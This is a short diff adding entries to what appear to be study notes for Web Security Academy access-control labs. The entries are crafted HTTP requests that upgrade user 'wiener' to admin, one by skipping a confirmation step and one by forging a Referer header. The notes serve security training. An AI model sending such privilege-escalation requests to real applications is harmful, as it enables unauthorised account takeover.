@@ -19,3 +19,16 @@ POST /my-account/change-email
 ```
 username=wiener&action=upgrade
 ```
+
+# Multi-step process with no access control on one step
+
+```
+action=upgrade&confirmed=true&username=wiener
+```
+
+# Referer-based access control
+
+```
+GET /admin-roles?username=wiener&action=upgrade
+Referer: https://0a3400e304aaf37c805efd3c00a200de.web-security-academy.net/admin
+```
